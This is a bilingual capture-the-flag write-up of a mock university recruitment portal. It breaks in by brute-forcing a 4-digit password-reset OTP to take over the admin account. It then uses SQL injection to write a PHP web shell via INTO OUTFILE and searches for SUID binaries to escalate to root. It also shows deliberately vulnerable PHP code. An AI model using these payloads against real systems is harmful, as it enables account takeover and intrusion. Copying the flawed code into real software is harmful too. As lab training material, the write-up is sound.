# FU Career

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

## VN ver

### Analyze

Đề bài mô phỏng một cổng tuyển dụng trực tuyến của FPTU Career, cho phép ứng viên đăng ký tài khoản, nộp CV và theo dõi trạng thái ứng tuyển.

Phía HR sử dụng một dashboard nội bộ để quản lý ứng viên và xem trước các CV được tải lên.

Do một số tính năng được phát triển gấp cho mùa tuyển dụng, hệ thống tiềm ẩn nhiều lỗ hổng bảo mật.

Mục tiêu của bài là khai thác các lỗ hổng này để leo thang đặc quyền lên **Admin** và cuối cùng đạt được **Remote Code Execution (RCE)**.

Đầu tiên khi truy cập vào trang web thì ta thấy có 2 chức năng chính là login và ứng tuyển , nhưng khi bấm ứng tuyển thì ta được yêu cầu phải đăng nhập , vậy nên ta sẽ tiến hành tạo 1 tài khoản mới

<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1001).png" alt=""><figcaption></figcaption></figure>

sau khi tạo xong tài khoản thì ta lại chú ý thêm 1 chức năng đó là quên mật khẩu

<figure><img src="../../.gitbook/assets/image (1003).png" alt=""><figcaption></figcaption></figure>

### privilege administrator

Ta sẽ thử xem qua xem nó có lỗ hổng logic nào không , và tôi thấy rằng nó chỉ kiểm tra username của user . Điều này vô cùng nguy hiểm , vì attacker hoàn toàn có thể liệt kê ra toàn bộ username của admin để ATO.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    
    $stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
```

<figure><img src="../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1005).png" alt=""><figcaption></figcaption></figure>

```php
    if ($result->num_rows === 0) {
        $_SESSION['flash'] = ['type' => 'danger', 'message' => 'Không tìm thấy username này.'];
    } else {
        $user = $result->fetch_assoc();
        $otp = sprintf("%04d", mt_rand(0, 9999));
        $now = date('Y-m-d H:i:s');
        
        $update = $conn->prepare("UPDATE users SET reset_otp = ?, reset_otp_created_at = ? WHERE id = ?");
        $update->bind_param("ssi", $otp, $now, $user['id']);
        $update->execute();
        
        // Log to Apache error log for challenge debug (simulating sending to internal mail)
        error_log("CTF OTP for $username is $otp (valid for 30 min)");
        
        $_SESSION['flash'] = ['type' => 'info', 'message' => 'OTP đã được gửi tới mailbox nội bộ. Hãy nhập mã trong vòng 30 phút để đặt lại mật khẩu.'];
        header("Location: reset.php?username=" . urlencode($username));
        exit;
    }
}
```

Ở đây nếu xác định được username đó tồn tại thì sẽ có 1 mã OTP được tạo ra để xác minh thay đổi mật khẩu và nó có hiệu lực trong 30 phút.

#### enum username

Tiếp đến bước tiếp theo ta sẽ phải đi liệt kê được các tài khoản admin trên web

Thì khi kéo xuống tận cùng của trang web thì ta để ý thấy có các địa chỉ gmail , và trong nhiều trường hợp thực tế các công ty sẽ đặt username rất đơn giản như là : `hr.fehn` chẳng hạn

ở đây ta sẽ liệt kê được 5 username có khả năng là của admin :

```
hr.fehn
hr.fedn
hr.fedcm
hr.fect
hr.feqn
```

<figure><img src="../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

Và ta xác nhận được là `hr.fehn` chính là username của admin

<figure><img src="../../.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1008).png" alt=""><figcaption></figcaption></figure>

bây giờ ta chỉ cần tiến hành config intruder để brute otp 4 chữ số

<figure><img src="../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

và ta tìm được OTP là 2652

<figure><img src="../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

và ta đã chiếm được tài khoản admin và có được part 1 của flag

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

### RCE

ở trong chức năng Preview thì sẽ ra sao nếu ra inject `'` vào

<figure><img src="../../.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>

Boomm , đây chính là lỗ hổng SQLi

<figure><img src="../../.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cv_id = $_POST['cv_id'] ?? '';
    
    $query = "SELECT * FROM cv_submissions WHERE id = $cv_id";
    $result = @mysqli_query($conn, $query);
    
    if (!$result) {
        $_SESSION['flash'] = ['type' => 'danger', 'message' => 'Lỗi query preview: ' . mysqli_error($conn)];
        header("Location: admin.php");
        exit;
    }
```

ở đây ta thấy `$cv_id` trược truyền thẳng vào câu query mà không được validate nên attacker có thể inject thêm quote để escape và đánh lừa phía backend đây là một instruction hợp lệ

Và do config sai vậy nên ở đây sẽ có thể dẫn tới Rce bằng cách ghi file

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

và ta xác định được là có 9 cột thông qua dùng `ORDER BY`\
![](<../../.gitbook/assets/image (1016).png>)![](<../../.gitbook/assets/image (1017).png>)

payload của sqli2rce thì có thể tham khảo tại đây : [https://dudisamarel.gitbook.io/oscp-notes/web-attacks/sql-injection-sqli#create-files](https://dudisamarel.gitbook.io/oscp-notes/web-attacks/sql-injection-sqli#create-files)

<figure><img src="../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

```sql
cv_id=0 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'<?php system($_GET["cmd"]); ?>',NULL,'2026-01-01'INTO OUTFILE '/var/www/html/uploads/shell.php'
```

<figure><img src="../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

#### Privilege escalation

ở đây ta thấy `/part2.txt` được set perm chỉ cho user root đọc

<figure><img src="../../.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

đến đây ta sẽ thử tìm đường leo quyền bằng SUID <[https://hieus-organization-25.gitbook.io/canhieu-writeup/tryhackme/linux-privilege-escalation-basic#vi.-privilege-escalation-suid](https://hieus-organization-25.gitbook.io/canhieu-writeup/tryhackme/linux-privilege-escalation-basic#vi.-privilege-escalation-suid)>

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

ta thấy có 1 lệnh khả nghi là `/usr/bin/csvtool` và được chạy dưới quyền của user root

{% embed url="https://gtfobins.org/#csvtool" %}

<figure><img src="../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>

## Eng ver

### Analyze

The challenge simulates an online recruitment portal for FPTU Career, allowing candidates to register accounts, submit CVs, and track their application status.

HR uses an internal dashboard to manage candidates and preview uploaded CVs.

Because some features were developed in a rush for the recruitment season, the system contains several potential security flaws.

The goal of the challenge is to exploit these vulnerabilities to escalate privileges to **Admin** and finally achieve **Remote Code Execution (RCE)**.

At first, when accessing the website, we can see two main functions: login and apply. However, when clicking apply, we are required to log in first. So we will proceed by creating a new account.

<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1001).png" alt=""><figcaption></figcaption></figure>

After creating the account, we notice another feature: forgot password.

<figure><img src="../../.gitbook/assets/image (1003).png" alt=""><figcaption></figcaption></figure>

### privilege administrator

We will check whether there is any logic flaw, and I found that it only verifies the user's username. This is extremely dangerous, because an attacker can fully enumerate all admin usernames for ATO.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    
    $stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
```

<figure><img src="../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1005).png" alt=""><figcaption></figcaption></figure>

```php
    if ($result->num_rows === 0) {
        $_SESSION['flash'] = ['type' => 'danger', 'message' => 'Không tìm thấy username này.'];
    } else {
        $user = $result->fetch_assoc();
        $otp = sprintf("%04d", mt_rand(0, 9999));
        $now = date('Y-m-d H:i:s');
        
        $update = $conn->prepare("UPDATE users SET reset_otp = ?, reset_otp_created_at = ? WHERE id = ?");
        $update->bind_param("ssi", $otp, $now, $user['id']);
        $update->execute();
        
        // Log to Apache error log for challenge debug (simulating sending to internal mail)
        error_log("CTF OTP for $username is $otp (valid for 30 min)");
        
        $_SESSION['flash'] = ['type' => 'info', 'message' => 'OTP đã được gửi tới mailbox nội bộ. Hãy nhập mã trong vòng 30 phút để đặt lại mật khẩu.'];
        header("Location: reset.php?username=" . urlencode($username));
        exit;
    }
}
```

Here, if the username is confirmed to exist, an OTP will be generated to verify the password reset, and it is valid for 30 minutes.

#### enum username

Next, we need to enumerate the admin accounts on the website.

When scrolling to the bottom of the website, we notice several Gmail addresses. In many real-world cases, companies set very simple usernames such as `hr.fehn`.

Here, we can enumerate 5 usernames that are likely to belong to admins:

```
hr.fehn
hr.fedn
hr.fedcm
hr.fect
hr.feqn
```

<figure><img src="../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

And we confirm that `hr.fehn` is indeed the admin username.

<figure><img src="../../.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1008).png" alt=""><figcaption></figcaption></figure>

Now we just need to configure Intruder to brute-force the 4-digit OTP.

<figure><img src="../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

And we find that the OTP is 2652.

<figure><img src="../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

And we have taken over the admin account and obtained part 1 of the flag.

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

### RCE

In the Preview function, what happens if we inject `'` into it?

<figure><img src="../../.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>

Boom — this is the SQLi vulnerability.

<figure><img src="../../.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cv_id = $_POST['cv_id'] ?? '';
    
    $query = "SELECT * FROM cv_submissions WHERE id = $cv_id";
    $result = @mysqli_query($conn, $query);
    
    if (!$result) {
        $_SESSION['flash'] = ['type' => 'danger', 'message' => 'Lỗi query preview: ' . mysqli_error($conn)];
        header("Location: admin.php");
        exit;
    }
```

Here, we can see that `$cv_id` is passed directly into the query without validation, so an attacker can inject an extra quote to escape and trick the backend into treating it as a valid instruction.

And because of this misconfiguration, it can lead to RCE by writing a file.

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

And we determine that there are 9 columns by using `ORDER BY`.\
![](<../../.gitbook/assets/image (1016).png>)![](<../../.gitbook/assets/image (1017).png>)

The payload for `sqli2rce` can be referenced here: [https://dudisamarel.gitbook.io/oscp-notes/web-attacks/sql-injection-sqli#create-files](https://dudisamarel.gitbook.io/oscp-notes/web-attacks/sql-injection-sqli#create-files)

<figure><img src="../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

```sql
cv_id=0 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'<?php system($_GET["cmd"]); ?>',NULL,'2026-01-01'INTO OUTFILE '/var/www/html/uploads/shell.php'
```

<figure><img src="../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

#### Privilege escalation

Here, we can see that `/part2.txt` is set with permissions so that only the root user can read it.

<figure><img src="../../.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

At this point, we will try to find a privilege escalation path through SUID <[https://hieus-organization-25.gitbook.io/canhieu-writeup/tryhackme/linux-privilege-escalation-basic#vi.-privilege-escalation-suid](https://hieus-organization-25.gitbook.io/canhieu-writeup/tryhackme/linux-privilege-escalation-basic#vi.-privilege-escalation-suid)>.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

We can see a suspicious command: `/usr/bin/csvtool`, and it runs with root privileges.

{% embed url="https://gtfobins.org/#csvtool" %}

<figure><img src="../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>
